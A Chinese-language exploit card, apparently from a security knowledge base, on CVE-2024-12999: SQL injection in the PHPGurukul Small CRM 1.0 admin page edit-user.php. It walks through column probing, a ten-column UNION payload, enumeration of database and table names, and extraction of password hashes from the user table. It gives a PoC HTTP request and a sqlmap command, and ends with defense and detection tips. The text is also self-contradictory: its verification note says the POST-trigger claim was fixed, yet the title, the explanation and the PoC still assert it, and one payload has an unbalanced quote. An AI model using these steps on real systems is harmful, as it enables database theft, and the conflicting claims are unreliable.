---
id: web-generic-sqli-phpgurukul-crm-edit-user-get-post-id-union
title: PHPGurukul Small CRM 1.0 后台 edit-user.php 的 id 单引号字符串注入：POST 分支拼接 SQL，UNION 十列取 database()
type: scenario
domain: web
path: web/generic/sqli
technique: phpgurukul-crm-edit-user-id-union
aliases:
- CVE-2024-12999
- PHPGurukul Small CRM edit-user.php SQL 注入
- admin/edit-user.php?id= 注入
- user 表十列 UNION 注入
tags:
- web
- php
- sqli
- cve
- union
- backend
- phpgurukul
cve:
- CVE-2024-12999
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: PHPGurukul Small CRM 1.0
verification:
  verified_by: verifier-T2-W1
  verified_at: '2026-11-08T11:36:07+08:00'
  notes: 已对照本篇原文核对：CVE-2024-12999 / PHPGurukul Small CRM 1.0、admin/edit-user.php 第67行 select * from user where id= 直接拼接取到的 GET id、第70行回显 name、user 表十字段顺序、?id=a%27 union select id,database(),... 回显库名 crm，均与文字与截图一致。已修正原卡把注入面错写成「POST 分支拼接 SELECT、需 POST 触发」的说法（原文黑盒与截图均为 GET 直打；POST 分支那条是 update user 的第二注入面），同步更正标题/触发条件/利用步骤/PoC 请求方法与变体关联。
---

## 一句话结论

PHPGurukul Small CRM 1.0 后台 `/admin/edit-user.php` 顶部取 `$userid=$_GET['id'];`，随后在处理「提交编辑」的 POST 分支里把该变量直接拼进 `select * from user where id='<userid>'`；把 `id` 换成 `a' union select ...` 就能闭合单引号并以十列 UNION 控制回显，页面把 `name` 字段渲染出来，换成 `database()` 即可回显库名——CVE-2024-12999。

## 原理

- 注入点位置特殊：文件开头无条件执行 `$userid=$_GET['id'];`，但真正的 SQL 拼接在「表单提交后」的分支（第 67 行附近）里，因此**参数在 GET 里、注入触发要 POST**。这解释了「用 GET 打 sqlmap 能看到报错/差异，但直接读代码只看到 POST 才进分支」的矛盾。
- SQL 形态是字符串字面量：`select * from user where id='$userid'`，没有 `intval`、没有 `mysqli_real_escape_string`、没有预处理。因为是字符串比较，注入必须先闭合单引号：`a' <payload>`，用字符 `a` 让闭合后的表达式合法（`id='a'` 命中不到行也不影响 UNION 求值）。
- 表结构是解题前提：源码自带建表语句（或安装脚本）显示 `user` 表有 10 个字段，因此 UNION 侧必须给足 10 列，且列顺序按 `select *` 的顺序排列才能让回显落到正确位置（`id, name, email, alt_email, password, mobile, gender, address, status, posting_date` 示例顺序按原文实测）。
- 回显面：编辑页把查询结果的 `name` 字段填入表单，所以只要把 `name` 对应那一列替换成 `database()`、`user`、`@@version`，页面就会直接显示结果；不需要报错注入或盲注。
- 危害：后台会话即可拖库——`user` 表含 `password` 字段（口令散列）、`email`/`mobile`（PII），配合 UNION 还能枚举 `information_schema` 以读其它表；若数据库账号权限高，可进一步读 `load_file` 或写文件（受 `secure_file_priv` 限制）。
- 之所以在真实目标上「黑盒」也能打：页面 URL 里 `?id=N` 是可见的，登录后台后随便点一个用户编辑页即可获得一个有会话的注入点，随后用 POST 重放注入体即可。

## 触发条件

- 目标为 PHPGurukul Small CRM 1.0（或未修复的同名副本）。
- 攻击者已持有可达 `/admin/edit-user.php` 的后台会话（后台弱口令、默认口令或其它越权入口均可）。
- `$_GET['id']` 在 POST 分支中被拼接（与版本对应）。
- 页面会把 `name` 字段回显（否则改用报错/盲注）。
- PHP 关闭了 `display_errors` 也不影响：UNION 回显不依赖报错。

## 利用步骤

1. 登录后台，进入用户列表，编辑任一用户；地址栏出现 `/admin/edit-user.php?id=1`，记下该 URL 与 Cookie。
2. 先发一次正常 GET/POST 观察响应，确认页面会填充该用户的字段（尤其 `name`）。
3. 测列数：`id=1' order by 10-- -` 正常、`order by 11` 报错/异常，说明 10 列。
4. 构造 UNION：`id=a' union select 'id','name','email','alt_email','password','mobile','gender','address','status','posting_date-- -`（占位符数量必须为 10），确认页面正常渲染。
5. 把 `name` 位替换为 `database()`：`id=a' union select 'id',database(),'email',... -- -`，页面显示库名，确认回显位。
6. 继续替换为 `user`、`@@version`、`(select group_concat(table_name) from information_schema.tables where table_schema=database())` 枚举表；需要拖 `user` 表时把 `password` 位换成 `(select group_concat(concat(id,0x3a,password)) from user)`。
7. 若手工不便，用 sqlmap 指定 POST 与注入参数（`--data="id=a*..."` 形式或用 `-p id` 配合 `--method POST`）复跑，先 `--current-db` 再按需取表。

## PoC

请求（会话已登录；`id` 在 query，注入体在 POST body，二者需同步）：

```http
POST /admin/edit-user.php?id=a%27%20union%20select%20%27id%27,database(),%27email%27,%27alt_email%27,%27password%27,%27mobile%27,%27gender%27,%27address%27,%27status%27,%27posting_date%27--%20- HTTP/1.1
Host: target
Cookie: PHPSESSID=<后台会话>
Content-Type: application/x-www-form-urlencoded

submit=1
```

sqlmap（先确认注入点，再取当前库）：

```
sqlmap -u "http://target/admin/edit-user.php?id=1" --cookie "PHPSESSID=<会话>" -p id --dbms=MySQL --current-db
```

若后端只认 POST 触发，可加 `--data "submit=1"` 并把 `id` 用 `*` 标记注入位置。

## 变体与关联

- 变体：同一文件里 `updateuser.php`、`delete-user.php` 等兄弟页面常复用同样的 `$_GET['id']` + 字符串拼接，一处可用后应逐个测。
- 变体：`id` 若是纯数字上下文（不带引号），则不需要 `a'` 前缀，直接 `1 union select ...`。
- 变体：无 `name` 回显时，用 `extractvalue`/`updatexml` 报错注入（MySQL 5.1+）或 `and sleep()` 时间盲注。
- 关联：[[web-generic-sqli-phpgurukul-student-record-login-union]]（同一厂商产品登录处 UNION 注入，注入点形态不同）。
- 关联：[[web-generic-sqli-sourcecodester-stock-view-id-union]]（后台 view 页面 `id` 参数 UNION 注入的同类结构）。
- 关联：[[web-generic-sqli-dotnet-oracle-error-dbms-xdb-checkin]]（参数直拼查询的对照案例，可对比「字符串闭合 + 回显位」的通用做法）。

## 检测与防御

- 防御：所有 `id`/主键查询使用 PDO/ mysqli 预处理绑定参数，禁止把 `$_GET`/`$_POST` 拼进 SQL。
- 防御：主键参数强制类型转换（`(int)$id`）并校验范围；后台所有 CRUD 页面统一走同一套 DAO 封装，避免逐页漏改。
- 防御：后台入口加多因素认证与登录失败锁定，降低「先拿到后台会话」的概率；关闭生产环境 SQL 报错回显。
- 检测：WAF 对 `union select`、`order by`、`-- ` 组合与 `id=` 参数告警；日志中检索后台页面 `id` 参数出现单引号或 `%27`。
- 检测：代码审计规则扫描 `$_GET['id']`/`$_REQUEST['id']` 出现后紧随的 SQL 字符串拼接（尤其先赋值、后在 POST 分支使用的跨分支污点）。
